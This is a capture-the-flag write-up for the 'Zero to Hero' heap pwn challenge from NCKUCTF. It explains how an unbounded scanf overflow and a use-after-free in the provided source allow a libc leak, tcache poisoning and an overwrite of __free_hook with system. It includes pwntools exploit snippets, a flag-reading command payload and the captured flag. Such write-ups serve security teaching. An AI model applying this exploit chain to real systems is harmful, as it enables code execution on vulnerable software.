TL;DR
Zero to Hero - Nerf Version 1 is a pwn challenge from NCKUCTF. This challenge is a heap-based pwn with source code provided in zero_to_hero.c and a custom libc glibc 2.31 .

Summary

This challenge is a heap-based pwn with source code provided in zero_to_hero.c and a custom libc glibc 2.31 .

Purpose of exploit:

  1. Get the leak address libc .
  2. Perform tcache poisoning.
  3. Overwrite __free_hook with system .
  4. Trigger free() on the chunk that contains the command to read the flag.

Flags:

1

NCKUCTF{from_zer0_t0_h34p_HEROOOOO0000!!!!!!_fba2055cd5555a5edb8a615c3a56ca8d}

Binary Information

Binary protection:

  • Full RELRO
  • Stack Canary
  • NX enabled
  • PIE enabled
  • SHSTK enabled
  • IBT enabled

The above protections make approaches such as GOT overwrite or shellcode injection irrelevant. The most reasonable path is a pure heap exploit against libc.

The libcs provided are:

1

GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.17) stable release version 2.31

This is important because:

  • __free_hook still available.
  • Tcache safe-linking is missing in glibc 2.31.

This combination makes tcache poisoning the simplest exploit path.

Source Code Audits

Following are the relevant source sections.

1. Heap overflow on add_power() In zero_to_hero.c:31-41 , the program requests the chunk size with malloc(size) , but input chunk contents are read using: 

1

scanf("%s", v0);

The problem: scanf("%s") does not limit the input length to the allocation size. This means that users can send data longer than size and perform a heap overflow to the next chunk.

2. Use-after-free and double free on remove_power() In zero_to_hero.c:59-61 : 

1
2

free(bins[index]);
// bins[index] = NULL;

Pointers after free() are not reset to NULL . As a result:

  • bins[index] still points to chunks that have already been freed.
  • The chunk can still be accessed via print_power() .
  • The chunk can also still be free() again, so that double free appears.

3. Print-after-free on print_power() In zero_to_hero.c:78 : 

1
2

printf("Your superpower is: %s
", bins[index]);

Because the freed pointer is never null, this function is a very strong leak primitive.

Available Primitives

From the above audit, This challenge provides three main primitives:

  1. Heap overflow via scanf("%s") .
  2. Use-after-free / print-after-free.
  3. Double free.

The final exploit only requires:

  1. print-after-free for leak libc .
  2. heap overflow for precise tcache poisoning.

Double free is actually available, but is not required to be used in the final solution.

Exploitation Strategy

In general, the strategy used is:

  1. Allocate a large chunk so that when it is freed it goes into the unsorted bin.
  2. Print the contents of the freed chunk to leak the pointer main_arena , then calculate the base libc .
  3. Prepare three small chunks in sequence in the same tcache size class.
  4. Free the three small chunks to form a linked list tcache.
  5. Reallocate the first chunk and use overflow to overwrite the second chunk’s fd which is currently in tcache.
  6. Point the fd to __free_hook .
  7. Allocate again until the allocator returns a pointer to __free_hook .
  8. Write the address system to __free_hook .
  9. Free chunk containing the flag reader command.

Methodology 1: Leak libc from Unsorted Bin

First, allocate a large chunk:

  • Chunk 0 : size request 0x500 This size was chosen so that after being free , the chunk does not go to tcache but instead goes to the unsorted bin.

Then:

  1. free(0) 2. print(0) As of glibc 2.31, chunks that enter the unsorted bin will have fd and bk pointers that point to the arena’s internal structure in libc. Because print_power() prints the contents of a freed chunk as a string, the initial byte of the chunk will leak the pointer.

In the exploit, the leak is processed like this:

1
2
3

free(io, 0)
leak = u64(show(io, 0).ljust(8, b""))
libc.address = leak - 0x1ECBE0

The offset 0x1ECBE0 is obtained from the bundled libc challenge and is the offset of the leaked arena pointer against the base libc .

Result of this step:

  • libc base known.
  • Addresses __free_hook and system can be calculated.

Methodology 2: Setting Up Heap Layout for Tcache Poisoning

After a large chunk for the leak, prepare the following chunk:

  • Chunk 1 : size request 0x20 , contains the command
  • Chunk 2 : size request 0x40 - Chunk 3 : size request 0x40 - Chunk 4 : size request 0x40 Chunks 2 , 3 , and 4 must be next to each other on the heap so that overflow from chunk 2 can reach the metadata/user area of ​​chunk 3 .

Then free in order:

  1. free(4) 2. free(3) 3. free(2) For size 0x40 , the real chunk size is 0x50 . After the three frees above, the tcache bin for size 0x50 will take the form:
1

head -> chunk2 -> chunk3 -> chunk4

Methodology 3: Overflow to Overwrite fd Tcache

Now reallocate another chunk 0x40 . Since chunk2 is in the tcache head, the allocator will return the area belonging to chunk2 .

This is where overflow is used.

Written payload:

1
2
3
4
5
6

poison = flat(
    b"A" * 0x40,
    0,
    0x51,
    free_hook,
)

Meaning:

  • b"A" * 0x40 fills in user data chunk2 .
  • 0 overrides prev_size ’s chunk3 .
  • 0x51 rewrote size ’s chunk3 to stay consistent.
  • free_hook overwrites the first qword in the chunk3 user area, namely the fd field used by tcache.

Relative layout from the point of view of the user area chunk2 :

1
2
3
4

offset 0x00 - 0x3f : data chunk2
offset 0x40 - 0x47 : prev_size chunk3
offset 0x48 - 0x4f : size chunk3
offset 0x50 - 0x57 : tcache fd milik chunk3

So an overflow of 0x58 bytes is enough to corrupt the next fd chunk without needing to touch anything else.

After this overwrite, tcache’s linked list logically changes to:

1

head -> chunk3 -> __free_hook

Methodology 4: Taking a Pointer to __free_hook Do two more allocations on size 0x40 :

  1. The first allocation takes chunk3 .
  2. The second allocation takes a fake address, namely __free_hook .

In exploit:

1
2

add(io, 0x40, b"JUNK")         # ambil chunk3
add(io, 0x40, p64(hook_addr))  # tulis ke __free_hook

At this stage, hook_addr is filled with the address system .

Methodology 5: Trigger system(command) Chunk 1 from the beginning is filled with command: 

1

cat</flag||cat<./flag||cat<flag

Then just call:

1

free(io, 1)

Because __free_hook already contains system , calling free(chunk1) changes its effect to:

1

system(chunk1);

The command above is made without spaces because the input uses scanf("%s") , so the whitespace character will stop reading.

The fallback || is used so that the command still succeeds even though the flag location is different, for example:

  • /flag - ./flag - flag ## Why Exploits Need Retry

The final exploit checks certain bytes at addresses __free_hook and system :

1
2
3

BAD_BYTES = set(b"	

 ")

The reason is that scanf("%s") stops when it encounters whitespace. If one of the bytes of the address you wish to write happens to be:

  • 0x09 - 0x0a - 0x0b - 0x0c - 0x0d - 0x20 then the payload will be truncated before the overwrite is complete.

Because ASLR randomizes the base libc , these bytes can change with each connection. So solve.py uses automatic retry in remote mode until it finds an address that is safe to write to.

Why PIE Isn’t a Problem

Binary is PIE, but this exploit doesn’t require a base binary at all.

All important stages require only:

  1. Leak libc .
  2. Calculation __free_hook .
  3. Calculation system .

So even without a base binary leak, the exploit still runs.

Complete Exploit Flow

Final order used:

  1. Send y to enter the main menu.
  2. Allocate large chunk 0x500 to leak unsorted bin.
  3. Allocate chunk command 0x20 .
  4. Allocate three chunks 0x40 .
  5. free(0) then show(0) for leak libc .
  6. Calculate libc base , __free_hook , and system .
  7. free(4) , free(3) , free(2) to set up tcache.
  8. Reallocate chunk2 and overflow to fd ’s chunk3 .
  9. Allocate again to retrieve chunk3 .
  10. Allocate once again to get the pointer to __free_hook .
  11. Write system to __free_hook .
  12. free(1) to run the flag reader command.

    io.send(b"y

    add(io, 0x500, b"A")
    add(io, 0x20, command)
    add(io, 0x40, b"A")
    add(io, 0x40, b"B")
    add(io, 0x40, b"C")

    free(io, 0)
    leak = u64(show(io, 0).ljust(8, b""))
    libc.address = leak - UNSORTED_FD_OFFSET

    free_hook = libc.sym.__free_hook
    hook_addr = libc.sym[hook_symbol]

    free(io, 4)
    free(io, 3)
    free(io, 2)

    add(io, 0x40, b"JUNK")
    add(io, 0x40, p64(hook_addr))

    free(io, 1)

Additional Notes

There are two details that are easy to miss:

  1. The get_total_len() function searches for the first slot that is NULL . Because the freed pointer is never reset, the old slot is not reused. This makes the new allocation index deterministic as long as the total number of allocations does not exceed 8.
  2. The final solution does not need to be double free even though the bug does exist. A more stable primitive is actually a combination of leak unsorted bin and heap overflow.

Conclusion

This challenge is basically a combination of three classic heap bugs:

  1. unbounded writing,
  2. use-after-free,
  3. dangling the pointer after free .

With libc 2.31, this combination is sufficient for:

  1. leak libc via unsorted bin,
  2. tcache poisoning without safe-linking,
  3. overwrite __free_hook ,
  4. execute arbitrary commands via system .

This solution is stable, compact, and does not require a leak PIE or ROP chain.
